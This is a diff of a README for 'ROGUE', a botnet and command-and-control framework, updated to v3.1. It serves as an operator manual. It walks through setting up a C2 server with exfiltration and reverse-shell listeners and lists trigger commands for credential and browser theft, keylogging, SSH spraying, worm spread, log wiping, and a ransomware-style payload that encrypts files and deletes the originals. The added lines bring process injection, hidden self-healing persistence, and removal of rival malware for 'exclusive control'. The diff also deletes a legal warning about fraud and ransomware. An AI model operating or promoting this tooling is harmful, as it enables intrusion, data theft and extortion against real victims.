@@ -1,26 +1,33 @@
-# ROGUE - Botnet w/ integrated c2 v3.0
+# ROGUE - Botnet w/ Integrated C2 v3.1
 
 ![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)
 
-## Overview
+## !Disclaimer: This tool is provided for educational purposes. Only use on systems you own or have written permission to test on.
 
-ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.
-
-** EXTREME WARNING: The File Encryption payload (fileransom.py) is DESTRUCTIVE.** It permanently removes original files. Only use in isolated test environments with proper authorization.
+ROGUE v3.1 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.
 
 ---
 
-##  What's New in v3.0
+## What's New in v3.1
 
-### **Enhanced Payload Suite**
-- **12+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
+### **Advanced Payload Suite**
+- **16+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
+- **4 New Advanced Payloads** for elite operations
 - **Compound Operations** for automated red team workflows
 - **Advanced Stealth** with improved persistence and evasion techniques
-- **File Encryption Payload** - AES-256 encryption/decryption with password protection (⚠️ DESTRUCTIVE)
+- **File Encryption Payload** - AES-256 encryption/decryption with password protection
+- **EXTREME WARNING: The File Encryption payload (fileransom.py) is DESTRUCTIVE.** It permanently removes original files. Only use in isolated test environments with proper authorization.
+
+### **New Advanced Payloads**
+- **Process Injection** - Inject implant into legitimate processes for maximum stealth
+- **Advanced File Hider** - Hide files using extended attributes and filesystem manipulation
+- **Advanced Cron Persistence** - Sophisticated cron-based persistence with randomization
+- **Competitor Cleaner** - Remove other malware/botnets from the system
 
 ### **Modern Web Interface**
 - **Tabbed Interface** for organized operation management
-- **Category-Based Operations** (Recon, Persistence, Collection, etc.)
+- **New Advanced Tab** dedicated to elite payloads
+- **Category-Based Operations** (Recon, Persistence, Collection, Advanced, etc.)
 - **Real-time Results Viewer** with command history
 - **Payload Management System** with direct load/run capabilities
 - **File Encryption Tool** - Dedicated interface with safety warnings
@@ -31,10 +38,11 @@ ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed f
 - **Forensic Cleanup** - Automated log cleaning and trace removal
 - **DNS Tunneling** - Covert C2 channel via DNS queries
 - **File Encryption** - AES-256 encryption with password recovery
+- **Advanced Stealth Suite** - Process injection and file hiding
 
 ---
 
-##  Installation & Setup
+## Installation & Setup
 
 ### **Clone Repository**
 ```bash
@@ -53,7 +61,6 @@ pip3 install pycryptodome flask requests psutil setproctitle netifaces --break-s
 
 # Optional dependencies for enhanced payloads
 pip3 install paramiko pynput pyautogui python-nmap secretstorage --break-system-packages
-
 ```
 
 **Note:** If you don't want to use `--break-system-packages`, make a venv and do it from there:
@@ -76,7 +83,7 @@ ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
 
 ---
 
-##  Quick Start Guide
+## Quick Start Guide
 
 ### **1. Start C2 Server** (Control Center)
 ```bash
@@ -88,14 +95,15 @@ python3 rogue_c2.py
 ============================================================
  ROGUE C2 SERVER - Complete Command & Control
 ============================================================
-[✓] Exfil listener started on port 9091
-[✓] Reverse shell listener started on port 9001
+[+] Exfil listener started on port 9091
+[+] Reverse shell listener started on port 9001
 [*] Starting ngrok tunnel...
-[✓] C2 SERVER IS LIVE!
+[+] C2 SERVER IS LIVE!
 [NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
 [NGROK] Hostname: your-subdomain.ngrok-free.dev
 [NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
 [ADMIN] Web Panel: http://localhost:4444/admin
+[ADVANCED] 4 New Payloads Added: Process Injection, File Hider, Cron Persist, Competitor Cleaner
 ============================================================
 ```
 
@@ -129,7 +137,7 @@ done
 
 ---
 
-##  Web Interface Guide
+## Web Interface Guide
 
 ### **Access Control Panel**
 ```
@@ -144,8 +152,7 @@ http://localhost:4444/admin
 - Monitor command results and pending queues
 - Color-coded status indicators (green = active)
 - **File Encryption Tool** - Dedicated interface with warnings
-
-![IMG_1038](https://github.com/user-attachments/assets/68ce8029-3366-49a2-97e9-74e462274015)
+- **Advanced Payloads Section** - Quick access to new capabilities
 
 #### **Tab 2: Operations**
 **Reconnaissance & Intelligence**
@@ -157,16 +164,24 @@ trigger_browsersteal    # Browser credential theft
 trigger_network_scan    # Network host discovery
 ```
 
-**Advanced Operations**
+**Advanced Operations (NEW)**
+```bash
+trigger_procinject      # Process injection for stealth execution
+trigger_filehide        # Advanced file hiding techniques
+trigger_cronpersist     # Advanced cron persistence methods
+trigger_compclean       # Clean competitor malware/botnets
+```
+
+**Compound Operations**
 ```bash
 trigger_full_recon      # Complete reconnaissance suite
 trigger_harvest_all     # Comprehensive data collection
 trigger_clean_sweep     # Forensic cleanup & restart
 ```
 
-** File Operations (DESTRUCTIVE)**
+**File Operations (DESTRUCTIVE)**
 ```bash
-trigger_fileransom encrypt /path [password]  # Encrypt files ( removes originals)
+trigger_fileransom encrypt /path [password]  # Encrypt files (removes originals)
 trigger_fileransom decrypt /path <password>  # Decrypt files with password
 # Quick actions in web interface:
 # - Encrypt Documents (/home/user/Documents)
@@ -231,22 +246,31 @@ trigger_dumpcreds       # Dump credentials from common locations
 - Payload descriptions and categories
 - Organized by operation type
 - **File Encryption** marked with orange warnings
+- **Advanced Payloads** marked with purple "NEW" badges
 
-#### **Tab 4: Results**
+#### **Tab 4: Advanced (NEW)**
+- **Process Injection** - Inject implant into legitimate processes (systemd, sshd, etc.) for maximum stealth
+- **Advanced File Hider** - Hide files using extended attributes, hidden directories, and filesystem manipulation
+- **Advanced Cron Persistence** - Sophisticated cron-based persistence with randomization and anti-detection
+- **Competitor Cleaner** - Identify and remove other malware, botnets, and competitor implants
+- Advanced operations console for elite payloads
+
+#### **Tab 5: Results**
 - Command execution history
 - Timestamped results
 - Filter by bot ID
 - Export capabilities
 
-#### **Tab 5: Server Status**
+#### **Tab 6: Server Status**
 - Server uptime
 - Ngrok tunnel status
 - Active bot count
 - System resource monitoring
+- Advanced payloads count
 
 ---
 
-##  Payload Reference
+## Payload Reference
 
 ### **Core Payloads**
 
@@ -307,7 +331,53 @@ trigger_logclean        # Clean implant traces
 trigger_logclean all    # Aggressive system log cleaning
 ```
 
-#### ** File Encryption** (`fileransom.py`) - **DESTRUCTIVE**
+### **Advanced Payloads (NEW)**
+
+#### **Process Injection** (`process_inject.py`)
+```bash
+trigger_procinject
+```
+**Features:**
+- Inject Rogue implant into legitimate system processes
+- Memory-only execution to bypass file scanning
+- Target processes: systemd, sshd, nginx, apache
+- Persist across reboots via injected processes
+- Bypass traditional process monitoring tools
+
+#### **Advanced File Hider** (`advanced_filehider.py`)
+```bash
+trigger_filehide
+```
+**Features:**
+- Hide files using Linux extended attributes
+- Dot-prefix manipulation and hidden directories
+- Filesystem tunneling techniques
+- Anti-forensics methods to evade detection
+- Make files invisible to standard system tools
+
+#### **Advanced Cron Persistence** (`advanced_cron_persistence.py`)
+```bash
+trigger_cronpersist
+```
+**Features:**
+- Randomized execution times to evade pattern detection
+- Obfuscated cron entries that appear legitimate
+- Multiple backup persistence methods
+- Self-healing capability if removed
+- Anti-forensic techniques to hide cron jobs
+
+#### **Competitor Cleaner** (`competitor_cleaner.py`)
+```bash
+trigger_compclean
+```
+**Features:**
+- Detect and remove common malware families
+- Clean competitor C2 implants and backdoors
+- Remove unauthorized persistence mechanisms
+- System sanitization for exclusive control
+- Identify and neutralize threat actors on the system
+
+#### **File Encryption** (`fileransom.py`) - **DESTRUCTIVE**
 ```bash
 trigger_fileransom encrypt /path [password]  # Encrypt files
 trigger_fileransom decrypt /path <password>  # Decrypt files
@@ -347,7 +417,7 @@ trigger_dnstunnel       # Start DNS tunneling
 
 ---
 
-##  Configuration Files for Lateral Movement
+## Configuration Files for Lateral Movement
 
 ### **Purpose**
 These files are used by the **SSH credential sprayer (`sshspray.py`)** and **auto-deploy (`autodeploy.py`)** payloads for automated lateral movement and network propagation.
@@ -538,10 +608,82 @@ sed -i '/^#/d' ~/rogue/payloads/targets.txt
 
 ---
 
-##  File Encryption Usage Guide
+## Advanced Payloads Usage Guide
+
+### **Process Injection**
+```bash
+trigger_procinject
+```
+**Purpose:** Inject Rogue implant into legitimate system processes for maximum stealth
+
+**Features:**
+- Memory-only execution bypasses file scanning
+- Target processes include systemd, sshd, nginx, apache
+- Persistence across reboots through process injection
+- Difficult to detect with traditional monitoring tools
+
+**Usage Notes:**
+- Best used after gaining initial access
+- Combine with file hiding for complete stealth
+- Monitor process list for successful injection
+
+### **Advanced File Hider**
+```bash
+trigger_filehide
+```
+**Purpose:** Hide implant files using advanced filesystem techniques
+
+**Features:**
+- Extended attributes (xattr) for file hiding
+- Hidden dot directories and obscure naming
+- Filesystem tunneling to evade directory listing
+- Anti-forensic methods to prevent discovery
+
+**Usage Notes:**
+- Works on most Linux filesystems
+- Files remain hidden from standard ls commands
+- Requires root privileges for some hiding methods
+
+### **Advanced Cron Persistence**
+```bash
+trigger_cronpersist
+```
+**Purpose:** Establish sophisticated cron-based persistence
+
+**Features:**
+- Randomized execution times to avoid detection
+- Obfuscated cron entries that appear legitimate
+- Multiple fallback mechanisms
+- Self-repair if persistence is removed
+
+**Usage Notes:**
+- More resilient than basic cron persistence
+- Harder for automated tools to detect
+- Maintains access even if other methods fail
+
+### **Competitor Cleaner**
+```bash
+trigger_compclean
+```
+**Purpose:** Remove other malware and unauthorized implants
+
+**Features:**
+- Detects common malware signatures
+- Removes competitor C2 connections
+- Cleans unauthorized persistence methods
+- Sanitizes system for exclusive control
+
+**Usage Notes:**
+- Use when system appears compromised by other actors
+- Helps maintain exclusive access for red team operations
+- Creates cleaner environment for testing
+
+---
+
+## File Encryption Usage Guide
 
 ### **Safety First - Critical Warnings**
-**⚠️ THE FILE ENCRYPTION PAYLOAD IS DESTRUCTIVE ⚠️**
+**THE FILE ENCRYPTION PAYLOAD IS DESTRUCTIVE**
 - Original files are **permanently removed** after encryption
 - Files are only recoverable with the correct password
 - Always test in isolated environments first
@@ -574,11 +716,11 @@ sed -i '/^#/d' ~/rogue/payloads/targets.txt
    - Click "Execute File Encryption"
 
 ### **Web Interface Features**
-- **Orange warning boxes** for high visibility
-- **Confirmation dialogs** before destructive operations
-- **Quick action buttons** for common paths
-- **Custom form** for any path/password combination
-- **Password field** (optional for encryption, required for decryption)
+- Orange warning boxes for high visibility
+- Confirmation dialogs before destructive operations
+- Quick action buttons for common paths
+- Custom form for any path/password combination
+- Password field (optional for encryption, required for decryption)
 
 ### **Command Line Usage**
 ```bash
@@ -619,7 +761,7 @@ python3 ~/.cache/.rogue/fileransom.py decrypt /path [password]
 
 ---
 
-##  Advanced Usage
+## Advanced Usage
 
 ### **Compound Operations**
 
@@ -653,6 +795,25 @@ trigger_clean_sweep
 2. Defense evasion techniques
 3. Implant restart in stealth mode
 4. Forensic artifact removal
+
+### **Advanced Stealth Operations**
+
+#### **Complete Stealth Deployment**
+1. Initial access and reconnaissance
+2. Process injection (`trigger_procinject`)
+3. Advanced file hiding (`trigger_filehide`)
+4. Advanced cron persistence (`trigger_cronpersist`)
+5. Competitor cleanup (`trigger_compclean`)
+6. Log cleaning (`trigger_logclean all`)
+
+#### **Stealth Monitoring Setup**
+```bash
+# Deploy monitoring without detection
+trigger_keylogger      # Keystroke logging
+trigger_screenshot     # Screen capture
+trigger_dnstunnel      # Covert C2 channel
+trigger_filehide       # Hide monitoring files
+```
 
 ### **Implant Management**
 
@@ -702,7 +863,7 @@ trigger_dumpcreds
 
 ---
 
-##  Stealth & Persistence
+## Stealth & Persistence
 
 ### **Silent Operation Modes**
 
@@ -722,9 +883,10 @@ python3 rogue_implant.py
 
 1. **Bashrc Injection** - Primary persistence
 2. **Systemd Service** - Service-based persistence (optional)
-3. **Cron Jobs** - Scheduled execution
-4. **USB Worm** - Removable drive propagation
-5. **PolyRoot** - Privileged persistence via SUID
+3. **Advanced Cron Jobs** - Scheduled execution with randomization
+4. **Process Injection** - Memory-based persistence
+5. **USB Worm** - Removable drive propagation
+6. **PolyRoot** - Privileged persistence via SUID
 
 ### **Defense Evasion**
 
@@ -734,15 +896,17 @@ trigger_logclean        # Clean implant-specific logs
 trigger_logclean all    # Clean all suspicious entries
 ```
 
-**Process Hiding:**
-- Masquerades as `systemd-journald`
-- Randomizes check-in intervals
-- Uses encrypted communications
-- Implements P2P fallback channels
+**Advanced Evasion:**
+- Process injection into legitimate system processes
+- File hiding using extended attributes
+- Randomized beacon intervals
+- Encrypted communications
+- P2P fallback channels
+- DNS tunneling for covert C2
 
 ---
 
-##  C2 Communication
+## C2 Communication
 
 ### **Primary Channel (HTTPS)**
 - Encrypted AES-256 communication
@@ -767,16 +931,23 @@ trigger_logclean all    # Clean all suspicious entries
 - Bypasses network restrictions
 - Slower but highly stealthy
 
+### **Advanced C2 Features**
+- Encrypted command/response payloads
+- Implant identification and tracking
+- Command history and results logging
+- Batch operations across multiple implants
+- Real-time status monitoring
+
 ---
 
-##  Emergency Procedures
+## Emergency Procedures
 
 ### **Implant Removal from Target**
 ```bash
 # Quick removal (recommended)
 sudo pkill -9 -f rogue && sudo rm -rf ~/.cache/.rogue && \
 sed -i '/ROGUE\|rogue_agent\|systemd-journald/d' ~/.bashrc ~/.profile ~/.bash_profile && \
-echo "✓ Rogue removed"
+echo "Rogue removed"
 
 # Verification
 ps aux | grep -E "rogue|\.rogue" | grep -v grep || echo "System clean"
@@ -809,9 +980,19 @@ If you lose an encryption password:
 3. Check C2 command history for password in results
 4. If password is truly lost, files cannot be recovered
 
+### **Advanced Payload Cleanup**
+```bash
+# Remove process injection
+pkill -f "injected_process"
+# Remove hidden files
+find / -name ".*" -type f -exec ls -la {} \; 2>/dev/null | grep rogue
+# Clean cron persistence
+crontab -l | grep -v rogue | crontab -
+```
+
 ---
 
-##  Troubleshooting
+## Troubleshooting
 
 ### **Common Issues & Solutions**
 
@@ -863,6 +1044,18 @@ python3 --version
 chmod +x payloads/*.py
 ```
 
+**Advanced Payload Issues:**
+```bash
+# Check for required privileges
+sudo -v || echo "Root privileges required for some advanced payloads"
+
+# Verify extended attributes support
+getfattr -d /tmp/test 2>/dev/null || echo "xattr not supported"
+
+# Check cron service status
+systemctl status cron || service cron status
+```
+
 **File Encryption Issues:**
 ```bash
 # Check if pycryptodome is installed
@@ -887,6 +1080,11 @@ df -h /tmp
 - Console output (manual mode)
 - Beacon activity and command results
 
+**Advanced Payload Logs:**
+- Process injection logs in system journal
+- File hiding operations in extended attributes
+- Cron persistence logs in system logs
+
 **Network Diagnostics:**
 ```bash
 # Test C2 connectivity
@@ -896,11 +1094,14 @@ curl -k -I https://your-c2.ngrok-free.dev
 
 # Test exfiltration port
 nc -zv your-c2.ngrok-free.dev 9091
+
+# Test DNS tunneling
+dig @8.8.8.8 your-c2.ngrok-free.dev
 ```
 
 ---
 
-##  Command Quick Reference
+## Command Quick Reference
 
 ### **Essential Commands**
 ```bash
@@ -929,7 +1130,13 @@ trigger_linpeas
 trigger_hashdump
 trigger_browsersteal
 
-# File Operations (⚠️ DESTRUCTIVE)
+# Advanced Payloads (NEW)
+trigger_procinject
+trigger_filehide
+trigger_cronpersist
+trigger_compclean
+
+# File Operations (DESTRUCTIVE)
 trigger_fileransom encrypt /path [password]
 trigger_fileransom decrypt /path <password>
 
@@ -960,22 +1167,21 @@ trigger_help
 load_payload sysrecon.py
 run_payload sysrecon.py
 
-# Direct execution
-python3 ~/.cache/.rogue/sysrecon.py
+# Advanced payloads
+load_payload process_inject.py
+run_payload process_inject.py
 
-# File Encryption (⚠️ use with extreme caution)
+# File Encryption (use with extreme caution)
 load_payload fileransom.py
 run_payload fileransom.py
 ```
 
 ---
 
-##  License & Disclaimer
+## Disclaimer
 
-### **License**
-This project is released for educational purposes only. Users assume all responsibility for legal compliance.
 
-### ** EXTREME WARNING DISCLAIMER**
+### **!!!EXTREME WARNING DISCLAIMER!!!**
 ```
 THE FILE ENCRYPTION PAYLOAD (fileransom.py) IS DESTRUCTIVE SOFTWARE.
 It PERMANENTLY REMOVES ORIGINAL FILES during encryption.
@@ -990,12 +1196,10 @@ Users must:
 3. Maintain backups of all important data
 4. Assume full responsibility for encryption password management
 
-Unauthorized use of this software, particularly the file encryption capabilities,
-may constitute computer fraud, data theft, or ransomware attacks under applicable laws.
 ```
 
 ![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)
 
 ---
-*Last Updated: v3.0 | For authorized security testing only*  
-**⚠️ FILE ENCRYPTION: Use with extreme caution in isolated environments only**
+*Last Updated: v3.1 | For authorized security testing only*  
+**FILE ENCRYPTION: Use with extreme caution in isolated environments only**
